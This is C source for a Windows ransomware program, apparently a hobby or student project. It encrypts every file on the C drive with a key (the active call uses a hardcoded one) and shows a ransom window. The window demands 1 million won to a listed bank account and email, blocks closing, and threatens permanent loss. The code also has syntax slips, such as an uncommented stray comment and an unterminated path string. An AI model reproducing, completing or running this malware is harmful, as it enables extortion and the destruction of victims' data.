#define _CRT_OBSOLETE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define KEYBTN 1
#define _WINSOCKAPI_
#include <Windows.h>
#include <WinSock2.h>
#include "file.h"

#pragma comment(lib,"ws2_32.lib")

WNDCLASSA WndClass;
MSG msg;
HINSTANCE g_hInst;
POINT ptMouse;
PAINTSTRUCT ps;
HWND hKey;

LRESULT CALLBACK WinProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    WSADATA wsaData;
    SOCKET hSocket;
    SOCKADDR_IN servAddr;
    char enckey[17] = { 0, };
    int strLen;
    char* ip = "127.0.0.1";
    int port = 10000;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        exit(-1);
    hSocket = socket(PF_INET, SOCK_STREAM, 0);
    if (hSocket == INVALID_SOCKET)
        exit(-1);
    memset(&servAddr, 0, sizeof(servAddr));
    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.s_addr = inet_addr(ip);
    servAddr.sin_port = htons(port);
    if (connect(hSocket, (SOCKADDR*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
        exit(-1);
    strLen = recv(hSocket, enckey, sizeof(enckey) - 1, 0);
    if (strLen != 16)
        exit(-1);
    closesocket(hSocket);
    WSACleanup();

    all_files_enc_dec("C:\\", "moonseok_is_sexy", TRUE); enc all files in C drive.
    //all_files_enc_dec("C:\\test\\", enckey, TRUE); //C:\test is test directory.
    for (int i = 0; i < 16; i++)
        enckey[i] = 0;
    HBRUSH Brush = CreateSolidBrush(RGB(204, 0,0));
    WndClass.lpszClassName = "mainwindow";
    WndClass.hInstance = hInstance;
    WndClass.lpfnWndProc = WinProc;
    WndClass.hbrBackground = Brush;
    WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
    WndClass.cbClsExtra = 0;
    WndClass.cbWndExtra = 0;
    WndClass.lpszMenuName = NULL;

    RegisterClassA(&WndClass);

    CreateWindowA("mainwindow", "ransomware", WS_VISIBLE | WS_OVERLAPPEDWINDOW | WS_BORDER, 300, 200, 720, 560, NULL, NULL, g_hInst, NULL);

    while (GetMessageA(&msg, 0, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    return 0;
}
LRESULT CALLBACK WinProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
    HDC hdc;
    char key[17] = { 0, };
    switch (Msg)
    {
    case WM_PAINT:
        hdc = BeginPaint(hWnd, &ps);
        HFONT myFont = CreateFont(30, 0, 0, 0, 1000, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, NULL);
        HFONT oldFont = (HFONT)SelectObject(hdc, myFont);
        SetBkColor(hdc, RGB(204, 0, 0));
        SetTextColor(hdc, RGB(0, 0, 0));
        TextOutA(hdc, 170, 400, "Key : ", 6);
        TextOutA(hdc, 170, 50, "Your all files encrypted zzlol.", 31);
        TextOutA(hdc, 170, 100, "¿ì¸®ÀºÇà 1002262873043", 22);
        DeleteObject(myFont);
        myFont = CreateFont(15, 0, 0, 0, 1000, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, NULL);
        oldFont = (HFONT)SelectObject(hdc, myFont);
        TextOutA(hdc, 170, 250, "If you transfer 1 million won to the above account, I will give you a decryption key.", 85);
        TextOutA(hdc, 170, 280, "If decryption is attempted with an incorrect key or the program is terminated,", 78);
        TextOutA(hdc, 170, 310, "decryption is no longer possible.", 33);
        TextOutA(hdc, 170, 340, "Contact : dkffkffk503@gmail.com", 31);
        EndPaint(hWnd, &ps);
        break;
    case WM_CREATE:
        hKey = CreateWindowA("edit", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 240, 403, 200, 25, hWnd, NULL, g_hInst, NULL);
        CreateWindowA("button", "decrypt", WS_VISIBLE | WS_CHILD, 450, 402, 100, 30, hWnd, (HMENU)KEYBTN, g_hInst, NULL);
        break;
    case WM_COMMAND:
        switch (LOWORD(wParam)) {
        case KEYBTN:
            if (!GetWindowTextA(hKey, key, 17) || strlen(key) != 16)
                MessageBoxA(hWnd, "It is not a decryption key for this program.", "ransomware", MB_OK);
            else {
                MessageBoxA(hWnd, "Don't feel too bad about it. It was just bad luck.", "ransomware", MB_OK);
                all_files_enc_dec("C:\", key, FALSE);
                MessageBoxA(hWnd, "Decrypted all files.", "ransomware", MB_OK);
                PostQuitMessage(0);
            }
            break;
        }
        break;
    case WM_CLOSE:
        MessageBoxA(hWnd, "No close me. :) \nIf you close this program now, you cannot decrypt it forever.", "ransomware", MB_ICONWARNING);
        return 0;
    default:
        break;
    }
    return DefWindowProcA(hWnd, Msg, wParam, lParam);
}
